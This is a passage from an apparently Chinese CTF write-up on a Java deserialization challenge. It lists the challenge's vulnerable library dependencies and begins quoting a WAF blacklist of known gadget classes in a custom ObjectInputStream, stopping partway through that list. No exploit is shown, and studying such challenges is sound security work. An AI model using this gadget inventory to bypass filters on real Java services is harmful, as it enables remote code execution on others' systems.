\u0026lt;artifactId\u0026gt;jackson-datatype-jsr310\u0026lt;/artifactId\u0026gt; 108 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 109 \u0026lt;/dependency\u0026gt; 110 111 \u0026lt;dependency\u0026gt; 112 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.jaxrs\u0026lt;/groupId\u0026gt; 113 \u0026lt;artifactId\u0026gt;jackson-jaxrs-base\u0026lt;/artifactId\u0026gt; 114 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 115 \u0026lt;/dependency\u0026gt; 116 117 \u0026lt;dependency\u0026gt; 118 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.jaxrs\u0026lt;/groupId\u0026gt; 119 \u0026lt;artifactId\u0026gt;jackson-jaxrs-json-provider\u0026lt;/artifactId\u0026gt; 120 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 121 \u0026lt;/dependency\u0026gt; 122 123 \u0026lt;dependency\u0026gt; 124 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.module\u0026lt;/groupId\u0026gt; 125 \u0026lt;artifactId\u0026gt;jackson-module-jaxb-annotations\u0026lt;/artifactId\u0026gt; 126 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 127 \u0026lt;/dependency\u0026gt; 128 129 \u0026lt;dependency\u0026gt; 130 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.module\u0026lt;/groupId\u0026gt; 131 \u0026lt;artifactId\u0026gt;jackson-module-parameter-names\u0026lt;/artifactId\u0026gt; 132 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 133 \u0026lt;/dependency\u0026gt; 134 135 \u0026lt;!-- Jakarta --\u0026gt; 136 \u0026lt;dependency\u0026gt; 137 \u0026lt;groupId\u0026gt;jakarta.activation\u0026lt;/groupId\u0026gt; 138 \u0026lt;artifactId\u0026gt;jakarta.activation-api\u0026lt;/artifactId\u0026gt; 139 \u0026lt;version\u0026gt;1.2.2\u0026lt;/version\u0026gt; 140 \u0026lt;/dependency\u0026gt; 141 142 \u0026lt;dependency\u0026gt; 143 \u0026lt;groupId\u0026gt;jakarta.annotation\u0026lt;/groupId\u0026gt; 144 \u0026lt;artifactId\u0026gt;jakarta.annotation-api\u0026lt;/artifactId\u0026gt; 145 \u0026lt;version\u0026gt;1.3.5\u0026lt;/version\u0026gt; 146 \u0026lt;/dependency\u0026gt; 147 148 \u0026lt;dependency\u0026gt; 149 \u0026lt;groupId\u0026gt;jakarta.validation\u0026lt;/groupId\u0026gt; 150 \u0026lt;artifactId\u0026gt;jakarta.validation-api\u0026lt;/artifactId\u0026gt; 151 \u0026lt;version\u0026gt;2.0.2\u0026lt;/version\u0026gt; 152 \u0026lt;/dependency\u0026gt; 153 154 \u0026lt;dependency\u0026gt; 155 \u0026lt;groupId\u0026gt;jakarta.ws.rs\u0026lt;/groupId\u0026gt; 156 \u0026lt;artifactId\u0026gt;jakarta.ws.rs-api\u0026lt;/artifactId\u0026gt; 157 \u0026lt;version\u0026gt;2.1.6\u0026lt;/version\u0026gt; 158 \u0026lt;/dependency\u0026gt; 159 160 \u0026lt;dependency\u0026gt; 161 \u0026lt;groupId\u0026gt;jakarta.xml.bind\u0026lt;/groupId\u0026gt; 162 \u0026lt;artifactId\u0026gt;jakarta.xml.bind-api\u0026lt;/artifactId\u0026gt; 163 \u0026lt;version\u0026gt;2.3.3\u0026lt;/version\u0026gt; 164 \u0026lt;/dependency\u0026gt; 165 166 \u0026lt;!-- Javassist --\u0026gt; 167 \u0026lt;dependency\u0026gt; 168 \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; 169 \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; 170 \u0026lt;version\u0026gt;3.25.0-GA\u0026lt;/version\u0026gt; 171 \u0026lt;/dependency\u0026gt; 172 173 \u0026lt;!-- Jersey --\u0026gt; 174 \u0026lt;dependency\u0026gt; 175 \u0026lt;groupId\u0026gt;org.glassfish.jersey.core\u0026lt;/groupId\u0026gt; 176 \u0026lt;artifactId\u0026gt;jersey-client\u0026lt;/artifactId\u0026gt; 177 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 178 \u0026lt;/dependency\u0026gt; 179 180 \u0026lt;dependency\u0026gt; 181 \u0026lt;groupId\u0026gt;org.glassfish.jersey.core\u0026lt;/groupId\u0026gt; 182 \u0026lt;artifactId\u0026gt;jersey-common\u0026lt;/artifactId\u0026gt; 183 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 184 \u0026lt;/dependency\u0026gt; 185 186 \u0026lt;dependency\u0026gt; 187 \u0026lt;groupId\u0026gt;org.glassfish.jersey.containers\u0026lt;/groupId\u0026gt; 188 \u0026lt;artifactId\u0026gt;jersey-container-jdk-http\u0026lt;/artifactId\u0026gt; 189 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 190 \u0026lt;/dependency\u0026gt; 191 192 \u0026lt;dependency\u0026gt; 193 \u0026lt;groupId\u0026gt;org.glassfish.jersey.containers\u0026lt;/groupId\u0026gt; 194 \u0026lt;artifactId\u0026gt;jersey-container-servlet\u0026lt;/artifactId\u0026gt; 195 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 196 \u0026lt;/dependency\u0026gt; 197 198 \u0026lt;dependency\u0026gt; 199 \u0026lt;groupId\u0026gt;org.glassfish.jersey.containers\u0026lt;/groupId\u0026gt; 200 \u0026lt;artifactId\u0026gt;jersey-container-servlet-core\u0026lt;/artifactId\u0026gt; 201 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 202 \u0026lt;/dependency\u0026gt; 203 204 \u0026lt;dependency\u0026gt; 205 \u0026lt;groupId\u0026gt;org.glassfish.jersey.ext\u0026lt;/groupId\u0026gt; 206 \u0026lt;artifactId\u0026gt;jersey-entity-filtering\u0026lt;/artifactId\u0026gt; 207 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 208 \u0026lt;/dependency\u0026gt; 209 210 \u0026lt;dependency\u0026gt; 211 \u0026lt;groupId\u0026gt;org.glassfish.jersey.inject\u0026lt;/groupId\u0026gt; 212 \u0026lt;artifactId\u0026gt;jersey-hk2\u0026lt;/artifactId\u0026gt; 213 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 214 \u0026lt;/dependency\u0026gt; 215 216 \u0026lt;dependency\u0026gt; 217 \u0026lt;groupId\u0026gt;org.glassfish.jersey.media\u0026lt;/groupId\u0026gt; 218 \u0026lt;artifactId\u0026gt;jersey-media-json-jackson\u0026lt;/artifactId\u0026gt; 219 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 220 \u0026lt;/dependency\u0026gt; 221 222 \u0026lt;dependency\u0026gt; 223 \u0026lt;groupId\u0026gt;org.glassfish.jersey.media\u0026lt;/groupId\u0026gt; 224 \u0026lt;artifactId\u0026gt;jersey-media-sse\u0026lt;/artifactId\u0026gt; 225 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 226 \u0026lt;/dependency\u0026gt; 227 228 \u0026lt;dependency\u0026gt; 229 \u0026lt;groupId\u0026gt;org.glassfish.jersey.core\u0026lt;/groupId\u0026gt; 230 \u0026lt;artifactId\u0026gt;jersey-server\u0026lt;/artifactId\u0026gt; 231 \u0026lt;version\u0026gt;2.35\u0026lt;/version\u0026gt; 232 \u0026lt;/dependency\u0026gt; 233 234 \u0026lt;!-- JTA --\u0026gt; 235 \u0026lt;dependency\u0026gt; 236 \u0026lt;groupId\u0026gt;javax.transaction\u0026lt;/groupId\u0026gt; 237 \u0026lt;artifactId\u0026gt;jta\u0026lt;/artifactId\u0026gt; 238 \u0026lt;version\u0026gt;1.1\u0026lt;/version\u0026gt; 239 \u0026lt;/dependency\u0026gt; 240 241 \u0026lt;!-- Logging --\u0026gt; 242 \u0026lt;dependency\u0026gt; 243 \u0026lt;groupId\u0026gt;org.slf4j\u0026lt;/groupId\u0026gt; 244 \u0026lt;artifactId\u0026gt;jul-to-slf4j\u0026lt;/artifactId\u0026gt; 245 \u0026lt;version\u0026gt;1.7.36\u0026lt;/version\u0026gt; 246 \u0026lt;/dependency\u0026gt; 247 248 \u0026lt;dependency\u0026gt; 249 \u0026lt;groupId\u0026gt;org.slf4j\u0026lt;/groupId\u0026gt; 250 \u0026lt;artifactId\u0026gt;slf4j-api\u0026lt;/artifactId\u0026gt; 251 \u0026lt;version\u0026gt;1.7.36\u0026lt;/version\u0026gt; 252 \u0026lt;/dependency\u0026gt; 253 254 \u0026lt;dependency\u0026gt; 255 \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; 256 \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; 257 \u0026lt;version\u0026gt;2.17.2\u0026lt;/version\u0026gt; 258 \u0026lt;/dependency\u0026gt; 259 260 \u0026lt;dependency\u0026gt; 261 \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; 262 \u0026lt;artifactId\u0026gt;log4j-to-slf4j\u0026lt;/artifactId\u0026gt; 263 \u0026lt;version\u0026gt;2.17.2\u0026lt;/version\u0026gt; 264 \u0026lt;/dependency\u0026gt; 265 266 \u0026lt;dependency\u0026gt; 267 \u0026lt;groupId\u0026gt;ch.qos.logback\u0026lt;/groupId\u0026gt; 268 \u0026lt;artifactId\u0026gt;logback-classic\u0026lt;/artifactId\u0026gt; 269 \u0026lt;version\u0026gt;1.2.11\u0026lt;/version\u0026gt; 270 \u0026lt;/dependency\u0026gt; 271 272 \u0026lt;dependency\u0026gt; 273 \u0026lt;groupId\u0026gt;ch.qos.logback\u0026lt;/groupId\u0026gt; 274 \u0026lt;artifactId\u0026gt;logback-core\u0026lt;/artifactId\u0026gt; 275 \u0026lt;version\u0026gt;1.2.11\u0026lt;/version\u0026gt; 276 \u0026lt;/dependency\u0026gt; 277 278 \u0026lt;!-- OSGI --\u0026gt; 279 \u0026lt;dependency\u0026gt; 280 \u0026lt;groupId\u0026gt;org.glassfish.hk2\u0026lt;/groupId\u0026gt; 281 \u0026lt;artifactId\u0026gt;osgi-resource-locator\u0026lt;/artifactId\u0026gt; 282 \u0026lt;version\u0026gt;1.0.3\u0026lt;/version\u0026gt; 283 \u0026lt;/dependency\u0026gt; 284 285 \u0026lt;!-- SnakeYAML --\u0026gt; 286 \u0026lt;dependency\u0026gt; 287 \u0026lt;groupId\u0026gt;org.yaml\u0026lt;/groupId\u0026gt; 288 \u0026lt;artifactId\u0026gt;snakeyaml\u0026lt;/artifactId\u0026gt; 289 \u0026lt;version\u0026gt;1.29\u0026lt;/version\u0026gt; 290 \u0026lt;/dependency\u0026gt; 291 292 \u0026lt;!-- Spring Framework --\u0026gt; 293 \u0026lt;dependency\u0026gt; 294 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 295 \u0026lt;artifactId\u0026gt;spring-aop\u0026lt;/artifactId\u0026gt; 296 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 297 \u0026lt;/dependency\u0026gt; 298 299 \u0026lt;dependency\u0026gt; 300 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 301 \u0026lt;artifactId\u0026gt;spring-beans\u0026lt;/artifactId\u0026gt; 302 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 303 \u0026lt;/dependency\u0026gt; 304 305 \u0026lt;dependency\u0026gt; 306 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 307 \u0026lt;artifactId\u0026gt;spring-context\u0026lt;/artifactId\u0026gt; 308 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 309 \u0026lt;/dependency\u0026gt; 310 311 \u0026lt;dependency\u0026gt; 312 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 313 \u0026lt;artifactId\u0026gt;spring-core\u0026lt;/artifactId\u0026gt; 314 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 315 \u0026lt;/dependency\u0026gt; 316 317 \u0026lt;dependency\u0026gt; 318 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 319 \u0026lt;artifactId\u0026gt;spring-expression\u0026lt;/artifactId\u0026gt; 320 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 321 \u0026lt;/dependency\u0026gt; 322 323 \u0026lt;dependency\u0026gt; 324 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 325 \u0026lt;artifactId\u0026gt;spring-jcl\u0026lt;/artifactId\u0026gt; 326 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 327 \u0026lt;/dependency\u0026gt; 328 329 \u0026lt;dependency\u0026gt; 330 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 331 \u0026lt;artifactId\u0026gt;spring-web\u0026lt;/artifactId\u0026gt; 332 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 333 \u0026lt;/dependency\u0026gt; 334 335 \u0026lt;dependency\u0026gt; 336 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 337 \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; 338 \u0026lt;version\u0026gt;5.3.23\u0026lt;/version\u0026gt; 339 \u0026lt;/dependency\u0026gt; 340 341 \u0026lt;dependency\u0026gt; 342 \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; 343 \u0026lt;artifactId\u0026gt;spring-tx\u0026lt;/artifactId\u0026gt; 344 \u0026lt;version\u0026gt;5.3.30\u0026lt;/version\u0026gt; 345 \u0026lt;/dependency\u0026gt; 346 347 \u0026lt;!-- Spring Boot --\u0026gt; 348 \u0026lt;dependency\u0026gt; 349 \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; 350 \u0026lt;artifactId\u0026gt;spring-boot\u0026lt;/artifactId\u0026gt; 351 \u0026lt;version\u0026gt;2.6.13\u0026lt;/version\u0026gt; 352 \u0026lt;/dependency\u0026gt; 353 354 \u0026lt;dependency\u0026gt; 355 \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; 356 \u0026lt;artifactId\u0026gt;spring-boot-autoconfigure\u0026lt;/artifactId\u0026gt; 357 \u0026lt;version\u0026gt;2.6.13\u0026lt;/version\u0026gt; 358 \u0026lt;/dependency\u0026gt; 359 360 \u0026lt;dependency\u0026gt; 361 \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; 362 \u0026lt;artifactId\u0026gt;spring-boot-jarmode-layertools\u0026lt;/artifactId\u0026gt; 363 \u0026lt;version\u0026gt;2.6.13\u0026lt;/version\u0026gt; 364 \u0026lt;/dependency\u0026gt; 365 366 \u0026lt;!-- Tomcat --\u0026gt; 367 \u0026lt;dependency\u0026gt; 368 \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; 369 \u0026lt;artifactId\u0026gt;tomcat-embed-core\u0026lt;/artifactId\u0026gt; 370 \u0026lt;version\u0026gt;9.0.68\u0026lt;/version\u0026gt; 371 \u0026lt;/dependency\u0026gt; 372 373 \u0026lt;dependency\u0026gt; 374 \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; 375 \u0026lt;artifactId\u0026gt;tomcat-embed-el\u0026lt;/artifactId\u0026gt; 376 \u0026lt;version\u0026gt;9.0.68\u0026lt;/version\u0026gt; 377 \u0026lt;/dependency\u0026gt; 378 379 \u0026lt;dependency\u0026gt; 380 \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; 381 \u0026lt;artifactId\u0026gt;tomcat-embed-websocket\u0026lt;/artifactId\u0026gt; 382 \u0026lt;version\u0026gt;9.0.68\u0026lt;/version\u0026gt; 383 \u0026lt;/dependency\u0026gt; 相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf\n",
  "keywords": [
    "writeup", "ctf", "Web", "Javasec", "Java"
  ],
  "articleBody": "这是一个含有非常多危险依赖的题，如下：\n1 2 3 4 5 org.glassfish.hk2.external 6 aopalliance-repackaged 7 2.6.1 8 9 10 11 org.aspectj 12 aspectjweaver 13 1.9.2 14 15 16 17 18 com.oracle.coherence.ce 19 coherence 20 14.1.1-0-3 21 22 23 24 com.oracle.coherence.ce 25 coherence-rest 26 14.1.1-0-3 27 28 29 30 31 commons-beanutils 32 commons-beanutils 33 1.9.2 34 35 36 37 commons-collections 38 commons-collections 39 3.2.1 40 41 42 43 org.apache.commons 44 commons-collections4 45 4.0 46 47 48 49 commons-logging 50 commons-logging 51 1.2 52 53 54 55 56 org.codehaus.groovy 57 groovy 58 2.3.9 59 60 61 62 63 org.glassfish.hk2 64 hk2-api 65 2.6.1 66 67 68 69 org.glassfish.hk2 70 hk2-locator 71 2.6.1 72 73 74 75 org.glassfish.hk2 76 hk2-utils 77 2.6.1 78 79 80 81 82 com.fasterxml.jackson.core 83 jackson-annotations 84 2.13.4 85 86 87 88 com.fasterxml.jackson.core 89 jackson-core 90 2.13.4 91 92 93 94 com.fasterxml.jackson.core 95 jackson-databind 96 2.13.4.2 97 98 99 100 com.fasterxml.jackson.datatype 101 jackson-datatype-jdk8 102 2.13.4 103 104 105 106 com.fasterxml.jackson.datatype 107 jackson-datatype-jsr310 108 2.13.4 109 110 111 112 com.fasterxml.jackson.jaxrs 113 jackson-jaxrs-base 114 2.13.4 115 116 117 118 com.fasterxml.jackson.jaxrs 119 jackson-jaxrs-json-provider 120 2.13.4 121 122 123 124 com.fasterxml.jackson.module 125 jackson-module-jaxb-annotations 126 2.13.4 127 128 129 130 com.fasterxml.jackson.module 131 jackson-module-parameter-names 132 2.13.4 133 134 135 136 137 jakarta.activation 138 jakarta.activation-api 139 1.2.2 140 141 142 143 jakarta.annotation 144 jakarta.annotation-api 145 1.3.5 146 147 148 149 jakarta.validation 150 jakarta.validation-api 151 2.0.2 152 153 154 155 jakarta.ws.rs 156 jakarta.ws.rs-api 157 2.1.6 158 159 160 161 jakarta.xml.bind 162 jakarta.xml.bind-api 163 2.3.3 164 165 166 167 168 org.javassist 169 javassist 170 3.25.0-GA 171 172 173 174 175 org.glassfish.jersey.core 176 jersey-client 177 2.35 178 179 180 181 org.glassfish.jersey.core 182 jersey-common 183 2.35 184 185 186 187 org.glassfish.jersey.containers 188 jersey-container-jdk-http 189 2.35 190 191 192 193 org.glassfish.jersey.containers 194 jersey-container-servlet 195 2.35 196 197 198 199 org.glassfish.jersey.containers 200 jersey-container-servlet-core 201 2.35 202 203 204 205 org.glassfish.jersey.ext 206 jersey-entity-filtering 207 2.35 208 209 210 211 org.glassfish.jersey.inject 212 jersey-hk2 213 2.35 214 215 216 217 org.glassfish.jersey.media 218 jersey-media-json-jackson 219 2.35 220 221 222 223 org.glassfish.jersey.media 224 jersey-media-sse 225 2.35 226 227 228 229 org.glassfish.jersey.core 230 jersey-server 231 2.35 232 233 234 235 236 javax.transaction 237 jta 238 1.1 239 240 241 242 243 org.slf4j 244 jul-to-slf4j 245 1.7.36 246 247 248 249 org.slf4j 250 slf4j-api 251 1.7.36 252 253 254 255 org.apache.logging.log4j 256 log4j-api 257 2.17.2 258 259 260 261 org.apache.logging.log4j 262 log4j-to-slf4j 263 2.17.2 264 265 266 267 ch.qos.logback 268 logback-classic 269 1.2.11 270 271 272 273 ch.qos.logback 274 logback-core 275 1.2.11 276 277 278 279 280 org.glassfish.hk2 281 osgi-resource-locator 282 1.0.3 283 284 285 286 287 org.yaml 288 snakeyaml 289 1.29 290 291 292 293 294 org.springframework 295 spring-aop 296 5.3.23 297 298 299 300 org.springframework 301 spring-beans 302 5.3.23 303 304 305 306 org.springframework 307 spring-context 308 5.3.23 309 310 311 312 org.springframework 313 spring-core 314 5.3.23 315 316 317 318 org.springframework 319 spring-expression 320 5.3.23 321 322 323 324 org.springframework 325 spring-jcl 326 5.3.23 327 328 329 330 org.springframework 331 spring-web 332 5.3.23 333 334 335 336 org.springframework 337 spring-webmvc 338 5.3.23 339 340 341 342 org.springframework 343 spring-tx 344 5.3.30 345 346 347 348 349 org.springframework.boot 350 spring-boot 351 2.6.13 352 353 354 355 org.springframework.boot 356 spring-boot-autoconfigure 357 2.6.13 358 359 360 361 org.springframework.boot 362 spring-boot-jarmode-layertools 363 2.6.13 364 365 366 367 368 org.apache.tomcat.embed 369 tomcat-embed-core 370 9.0.68 371 372 373 374 org.apache.tomcat.embed 375 tomcat-embed-el 376 9.0.68 377 378 379 380 org.apache.tomcat.embed 381 tomcat-embed-websocket 382 9.0.68 383 相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf\n1import java.io.IOException; 2import java.io.InputStream; 3import java.io.InvalidClassException; 4import java.io.ObjectInputStream; 5import java.io.ObjectStreamClass; 6 7/* loaded from: AwdBypass-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/org/awd/awdbypass/serialization/SecurityObjectInputStream.class */ 8public class SecurityObjectInputStream extends ObjectInputStream { 9 public static String[] blacklist = {\"br.com.anteros.dbcp.AnterosDBCPConfig\", \"br.com.anteros.dbcp.AnterosDBCPDataSource\", \"bsh.Interpreter\", \"bsh.XThis\", \"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"ch.qos.logback.core.db.JNDIConnectionSource\", \"clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a\", \"clojure.lang.PersistentArrayMap\", \"com.alibaba.fastjson.JSONArray\", \"com.alibaba.fastjson.TypeReference\", \"com.alibaba.fastjson2.JSONArray\", \"com.caucho.config.types.ResourceRef\", \"com.fasterxml.jackson.databind.node.POJONode\", \"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", \"com.mchange.v2.c3p0.ComboPooledDataSource\", \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\", \"com.mchange.v2.c3p0.PoolBackedDataSource\", \"com.mchange.v2.c3p0.debug.AfterCloseLoggingComboPooledDataSource\", \"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\", \"com.mysql.cj.jdbc.MysqlConnectionPoolDataSource\", \"com.mysql.cj.jdbc.MysqlXADataSource\", \"com.mysql.cj.jdbc.admin.MiniAdmin\", \"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", \"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\", \"com.nqadmin.rowset.JdbcRowSetImpl\", \"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\", \"com.p6spy.engine.spy.P6DataSource\", \"com.pastdev.httpcomponents.configuration.JndiConfiguration\", \"com.sun.deploy.security.ruleset.DRSHelper\", \"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor\", \"com.sun.jmx.mbeanserver.JmxMBeanServer\", \"com.sun.jmx.mbeanserver.NamedObject\", \"com.sun.jmx.mbeanserver.Repository\", \"com.sun.org.apache.bcel.internal.util.ClassLoader\", \"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\", \"com.sun.org.apache.xalan.internal.xslt.ObjectFactory\", \"com.sun.org.apache.xalan.internal.xslt.Process\", \"com.sun.org.apache.xalan.internal.xsltc.DOM\", \"com.sun.org.apache.xalan.internal.xsltc.TransletException\", \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\", \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\", \"com.sun.org.apache.xml.internal.dtm.DTMAxisIterator\", \"com.sun.org.apache.xml.internal.serializer.SerializationHandler\", \"com.sun.rowset.JdbcRowSetImpl\", \"com.sun.syndication.feed.impl.ObjectBean\", \"com.vaadin.data.Property\", \"com.vaadin.data.util.NestedMethodProperty\", \"com.vaadin.data.util.PropertysetItem\", \"com.zaxxer.hikari.HikariConfig\", \"com.zaxxer.hikari.HikariDataSource\", \"flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor\", \"groovy.lang.Closure\", \"jodd.db.connection.DataSourceConnectionProvider\", \"net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup\", \"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\", \"net.sf.ehcache.transaction.manager.selector.GenericJndiSelector\", \"net.sf.ehcache.transaction.manager.selector.GlassfishSelector\", \"net.sf.json.JSONObject\", \"oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS\", \"oadd.org.apache.commons.dbcp.datasources.PerUserPoolDataSource\", \"oadd.org.apache.commons.dbcp.datasources.SharedPoolDataSource\", \"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\", \"om.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \"om.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl\", \"oracle.jdbc.connector.OracleManagedConnectionFactory\", \"oracle.jdbc.pool.OraclePooledConnection\", \"oracle.jdbc.rowset.OracleJDBCRowSet\", \"oracle.jms.AQjmsQueueConnectionFactory\", \"oracle.jms.AQjmsTopicConnectionFactory\", \"oracle.jms.AQjmsXAConnectionFactory\", \"oracle.jms.AQjmsXAQueueConnectionFactory\", \"oracle.jms.AQjmsXATopicConnectionFactory\", \"org..springframework.transaction.jta.JtaTransactionManager\", \"org.aoju.bus.proxy.provider.RmiProvider\", \"org.aoju.bus.proxy.provider.remoting.RmiProvider\", \"org.apache.activemq.ActiveMQConnectionFactory\", \"org.apache.activemq.ActiveMQXAConnectionFactory\", \"org.apache.activemq.jms.pool.JcaPooledConnectionFactory\", \"org.apache.activemq.jms.pool.XaPooledConnectionFactory\", \"org.apache.activemq.pool.JcaPooledConnectionFactory\", \"org.apache.activemq.pool.PooledConnectionFactory\", \"org.apache.activemq.pool.XaPooledConnectionFactory\", \"org.apache.activemq.spring.ActiveMQConnectionFactory\", \"org.apache.activemq.spring.ActiveMQXAConnectionFactory\", \"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", \"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl\", \"org.apache.axis2.transport.jms.JMSOutTransportInfo\", \"org.apache.bcel.internal.util.ClassLoader\", \"org.apache.catalina.authenticator.AuthenticatorBase\", \"org.apache.catalina.connector.Request\", \"org.apache.catalina.connector.RequestFacade\", \"org.apache.catalina.connector.Response\", \"org.apache.catalina.core.ApplicationFilterConfig\", \"org.apache.catalina.core.ApplicationServletRegistration\", \"org.apache.catalina.core.StandardContext\", \"org.apache.catalina.core.StandardService\", \"org.apache.catalina.core.StandardWrapperValue.invoke\", \"org.apache.catalina.deploy.FilterDef\", \"org.apache.catalina.deploy.FilterMap\", \"org.apache.catalina.loader.ParallelWebappClassLoader\", \"org.apache.catalina.loader.WebappClassLoaderBase\", \"org.apache.click.control.Column\", \"org.apache.click.control.Column$ColumnComparator\", \"org.apache.click.control.Table\", \"org.apache.commons.beanutils.BeanComparator\", \"org.apache.commons.codec.binary.Base64\", \"org.apache.commons.collections.Transformer\", \"org.apache.commons.collections.comparators.TransformingComparator\", \"org.apache.commons.collections.functors.ChainedTransformer\", \"org.apache.commons.collections.functors.ConstantTransformer\", \"org.apache.commons.collections.functors.InstantiateTransformer\", \"org.apache.commons.collections.functors.InvokerTransformer\", \"org.apache.commons.collections.functors.MapTransformer\", \"org.apache.commons.collections.keyvalue.TiedMapEntry\", \"org.apache.commons.collections.map.LazyMap\", \"org.apache.commons.collections.map.TransformedMap\", \"org.apache.commons.collections4.Transformer\", \"org.apache.commons.collections4.comparators.TransformingComparator\", \"org.apache.commons.collections4.functors.ChainedTransformer\", \"org.apache.commons.collections4.functors.ConstantTransformer\", \"org.apache.commons.collections4.functors.InstantiateTransformer\", \"org.apache.commons.collections4.functors.InvokerTransformer\", \"org.apache.commons.collections4.functors.MapTransformer\", \"org.apache.commons.collections4.keyvalue.TiedMapEntry\", \"org.apache.commons.collections4.map.LazyMap\", \"org.apache.commons.collections4.map.TransformedMap\", \"org.apache.commons.configuration.JNDIConfiguration\", \"org.apache.commons.configuration2.JNDIConfiguration\", \"org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS\", \"org.apache.commons.dbcp.datasources.PerUserPoolDataSource\", \"org.apache.commons.dbcp.datasources.SharedPoolDataSource\", \"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\", \"org.apache.commons.dbcp2.datasources.PerUserPoolDataSource\", \"org.apache.commons.dbcp2.datasources.SharedPoolDataSource\", \"org.apache.commons.fileupload.disk.DiskFileItem\", \"org.apache.commons.io.FileUtils\", \"org.apache.commons.io.output.DeferredFileOutputStream\", \"org.apache.commons.io.output.ThresholdingOutputStream\", \"org.apache.commons.jelly.impl.Embedded\", \"org.apache.commons.proxy.provider.remoting.RmiProvider\", \"org.apache.coyote.AbstractProtocol;\", \"org.apache.coyote.ProtocolHandler\", \"org.apache.coyote.Request\", \"org.apache.coyote.Response\", \"org.apache.cxf.jaxrs.provider.XSLTJaxbProvider\", \"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\", \"org.apache.ibatis.parsing.XPathParser\", \"org.apache.ignite.cache.jta.jndi.CacheJndiTmFactory\", \"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"org.apache.log4j.receivers.db.DriverManagerConnectionSource\", \"org.apache.log4j.receivers.db.JNDIConnectionSource\", 